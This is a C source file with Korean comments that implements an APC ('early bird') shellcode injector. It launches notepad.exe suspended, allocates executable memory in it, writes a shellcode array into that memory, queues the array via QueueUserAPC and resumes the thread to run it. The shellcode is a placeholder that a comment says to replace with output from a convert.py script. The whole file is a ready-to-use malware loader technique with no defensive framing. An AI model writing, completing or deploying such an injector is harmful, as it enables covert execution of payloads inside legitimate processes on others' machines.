#include <windows.h>
#include <stdio.h>

// ← 여기에 convert.py로 생성한 배열 붙여넣기
unsigned char shellcode[] = {
    0x4d, 0x5a, 0x90, 0x00, // 예시 바이트 (실제로는 변환 결과물 사용)
    // ...
};
SIZE_T shellcode_size = sizeof(shellcode); // 쉘코드 크기

int main() {

    printf("[*] APC 인젝터 시작\n");

    // ── 1단계: 대상 프로세스 Suspended 상태로 생성 ──
    STARTUPINFOA si = { 0 };        // 프로세스 시작 정보 초기화
    PROCESS_INFORMATION pi = { 0 }; // 프로세스/스레드 핸들 저장

    BOOL bCreated = CreateProcessA(
        NULL,             // 실행 파일 경로
        "notepad.exe",    // 인젝션 대상 프로세스
        NULL, NULL,       // 보안 속성 기본값
        FALSE,            // 핸들 상속 안 함
        CREATE_SUSPENDED, // ★ 일시정지 상태로 생성
        NULL, NULL,       // 환경변수/디렉토리 기본값
        &si, &pi          // 결과 저장
    );

    if (!bCreated) {      // 생성 실패 시
        printf("[!] 프로세스 생성 실패: %d\n", GetLastError());
        return -1;
    }
    printf("[+] notepad.exe 생성 완료 (PID: %d)\n", pi.dwProcessId);

    // ── 2단계: 대상 프로세스에 메모리 할당 ──
    LPVOID pRemoteMem = VirtualAllocEx(
        pi.hProcess,              // 대상 프로세스 핸들
        NULL,                     // 주소 자동 결정
        shellcode_size,           // 쉘코드 크기만큼 할당
        MEM_COMMIT | MEM_RESERVE, // 예약 + 커밋
        PAGE_EXECUTE_READWRITE    // 실행 가능 메모리
    );

    if (!pRemoteMem) {            // 할당 실패 시
        printf("[!] 메모리 할당 실패: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0); // 대상 프로세스 종료
        return -1;
    }
    printf("[+] 원격 메모리 할당: 0x%p\n", pRemoteMem);

    // ── 3단계: 쉘코드 복사 ──
    SIZE_T written = 0;           // 실제 쓰인 바이트 수
    BOOL bWritten = WriteProcessMemory(
        pi.hProcess,              // 대상 프로세스
        pRemoteMem,               // 목적지 주소
        shellcode,                // 복사할 쉘코드
        shellcode_size,           // 크기
        &written                  // 실제 쓰인 크기
    );

    if (!bWritten) {              // 쓰기 실패 시
        printf("[!] 메모리 쓰기 실패: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    printf("[+] 쉘코드 복사 완료: %zu bytes\n", written);

    // ── 4단계: APC 큐에 등록 ──
    DWORD dwResult = QueueUserAPC(
        (PAPCFUNC)pRemoteMem,     // 실행할 주소 (쉘코드)
        pi.hThread,               // 대상 스레드
        0                         // 파라미터 없음
    );

    if (!dwResult) {              // APC 등록 실패 시
        printf("[!] APC 등록 실패: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    printf("[+] APC 큐 등록 완료\n");

    // ── 5단계: 스레드 재개 → APC 실행 ──
    ResumeThread(pi.hThread);     // 정지된 스레드 재개
    printf("[+] 스레드 재개 → 쉘코드 실행!\n");

    // 잠시 대기 (쉘코드 실행 시간 확보)
    Sleep(3000);                  // 3초 대기

    // ── 핸들 정리 ──
    CloseHandle(pi.hThread);      // 스레드 핸들 반환
    CloseHandle(pi.hProcess);     // 프로세스 핸들 반환
    printf("[+] 완료\n");

    return 0;                     // 정상 종료
}